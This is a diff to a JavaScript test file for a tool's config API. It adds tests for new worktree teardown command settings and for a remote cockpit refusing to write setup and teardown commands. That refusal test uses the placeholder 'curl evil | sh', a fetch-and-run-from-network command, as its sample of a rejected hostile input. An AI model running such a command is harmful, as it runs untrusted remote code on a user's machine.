@@ -95,6 +95,8 @@ describe('the config API', () => {
       reviewGate: null,
       worktreeSetup: null,
       worktreeSetupIssue: null,
+      worktreeTeardown: null,
+      worktreeTeardownIssue: null,
     });
   });
 
@@ -227,6 +229,8 @@ describe('the config API', () => {
       reviewGate: null,
       worktreeSetup: null,
       worktreeSetupIssue: null,
+      worktreeTeardown: null,
+      worktreeTeardownIssue: null,
     });
   });
 
@@ -297,6 +301,27 @@ describe('the config API', () => {
     expect(String(body.worktreeSetupIssue)).toMatch(/^commands: /);
   });
 
+  // ---- worktreeTeardown (hearsay-tools/squawk#914) ----
+  it('PUT worktreeTeardown persists, round-trips and clears without touching worktreeSetup', async () => {
+    await put({ worktreeSetup: { commands: ['npm ci'] } });
+    const res = await put({ worktreeTeardown: { commands: ['make stop'], timeoutSeconds: 120 } });
+    expect(res.status).toBe(200);
+    expect(rawFile()).toEqual({ worktreeSetup: { commands: ['npm ci'] }, worktreeTeardown: { commands: ['make stop'], timeoutSeconds: 120 } });
+    const body = await getBody();
+    expect(body.worktreeTeardown).toEqual({ commands: ['make stop'], timeoutSeconds: 120 });
+    expect(body.worktreeTeardownIssue).toBeNull();
+    await put({ worktreeTeardown: { commands: [] } });
+    expect(rawFile()).toEqual({ worktreeSetup: { commands: ['npm ci'] } });
+  });
+
+  it('GET surfaces an invalid worktreeTeardown as its own issue', async () => {
+    writeFileSync(configPath(), JSON.stringify({ worktreeTeardown: { command: ['make stop'] } }));
+    const body = await getBody();
+    expect(body.worktreeTeardown).toBeNull();
+    expect(body.worktreeTeardownIssue).not.toBeNull();
+    expect(body.worktreeSetupIssue).toBeNull();
+  });
+
   it('PUT rejects 21 commands with 400', async () => {
     const res = await put({ worktreeSetup: { commands: Array.from({ length: 21 }, (_, i) => `echo ${i}`) } });
     expect(res.status).toBe(400);
@@ -316,7 +341,7 @@ describe('the config API', () => {
     expect(rawFile()).toEqual({ maxParallel: 99, mine: 1, reviewGate: true });
   });
 
-  it('a hosted cockpit cannot write worktreeSetup', async () => {
+  it('a hosted cockpit cannot write worktreeSetup or worktreeTeardown', async () => {
     const savedRemote = process.env.CEZ_REMOTE;
     process.env.CEZ_REMOTE = '1';
     try {
@@ -324,10 +349,13 @@ describe('the config API', () => {
       const refused = await put({ worktreeSetup: { commands: ['curl evil | sh'] } });
       expect(refused.status).toBe(409);
       expect(await refused.json()).toEqual({
-        error: `Worktree setup commands are read-only on this remote cockpit. To allow remote edits, run \`${productIdentity().command} remote-settings enable\` on the machine running ${productName('cezar')}.`,
+        error: `Worktree setup and teardown commands are read-only on this remote cockpit. To allow remote edits, run \`${productIdentity().command} remote-settings enable\` on the machine running ${productName('cezar')}.`,
       });
       expect(rawFile()).toEqual({ reviewGate: false });
       expect((await put({ worktreeSetup: null })).status).toBe(409);
+      expect((await put({ worktreeTeardown: { commands: ['curl evil | sh'] } })).status).toBe(409);
+      expect((await put({ worktreeTeardown: null })).status).toBe(409);
+      expect(rawFile()).toEqual({ reviewGate: false });
       const other = await put({ reviewGate: true });
       expect(other.status).toBe(200);
       expect(rawFile().reviewGate).toBe(true);
